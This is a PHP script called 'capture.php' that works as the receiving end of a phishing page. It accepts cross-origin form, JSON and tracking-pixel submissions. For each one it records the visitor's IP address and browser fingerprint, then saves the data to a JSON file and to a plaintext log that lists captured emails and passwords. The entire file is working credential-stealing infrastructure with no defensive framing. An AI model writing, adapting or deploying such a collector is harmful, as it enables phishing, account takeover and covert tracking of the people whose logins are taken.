<?php
// Enhanced capture.php - Multi-method data capture

// Allow CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Data storage file
$dataFile = 'captured_data.json';
$logFile = 'capture_log.txt';

// Get client IP with proxy support
function getClientIP() {
    $ip = '';
    $headers = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($headers as $header) {
        if (isset($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                $ip = trim($ips[0]);
            }
            break;
        }
    }
    
    return $ip ?: 'UNKNOWN';
}

// Get complete browser fingerprint
function getBrowserFingerprint() {
    return [
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown',
        'accept_encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'Unknown',
        'accept_charset' => $_SERVER['HTTP_ACCEPT_CHARSET'] ?? 'Unknown',
        'connection' => $_SERVER['HTTP_CONNECTION'] ?? 'Unknown',
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'Direct',
        'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'Unknown',
        'https' => isset($_SERVER['HTTPS']) ? 'Yes' : 'No',
        'server_protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'Unknown',
        'remote_port' => $_SERVER['REMOTE_PORT'] ?? 'Unknown'
    ];
}

// Save captured data
function saveData($data) {
    global $dataFile, $logFile;
    
    // Add timestamp and IP if not present
    $data['server_time'] = date('Y-m-d H:i:s');
    $data['ip_address'] = getClientIP();
    $data['browser_fingerprint'] = getBrowserFingerprint();
    
    // Save to JSON file
    $existingData = [];
    if (file_exists($dataFile)) {
        $existingData = json_decode(file_get_contents($dataFile), true) ?: [];
    }
    $existingData[] = $data;
    file_put_contents($dataFile, json_encode($existingData, JSON_PRETTY_PRINT));
    
    // Save to text log
    $logEntry = sprintf(
        "[%s] Email: %s | Password: %s | IP: %s | UserAgent: %s\n",
        date('Y-m-d H:i:s'),
        $data['email'] ?? 'N/A',
        $data['password'] ?? 'N/A',
        $data['ip_address'],
        substr($data['userAgent'] ?? 'Unknown', 0, 100)
    );
    file_put_contents($logFile, $logEntry, FILE_APPEND);
    
    return true;
}

// Handle POST data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);
    
    if ($data) {
        saveData($data);
        echo json_encode(['success' => true, 'message' => 'Data captured']);
    } else {
        // Try form data
        if (!empty($_POST)) {
            saveData($_POST);
            echo json_encode(['success' => true, 'message' => 'Form data captured']);
        } else {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'No data received']);
        }
    }
}
// Handle GET data (for pixel tracking)
elseif ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['data'])) {
    $data = json_decode(urldecode($_GET['data']), true);
    if ($data) {
        saveData($data);
    }
    // Return 1x1 pixel
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
}
else {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
}
?>
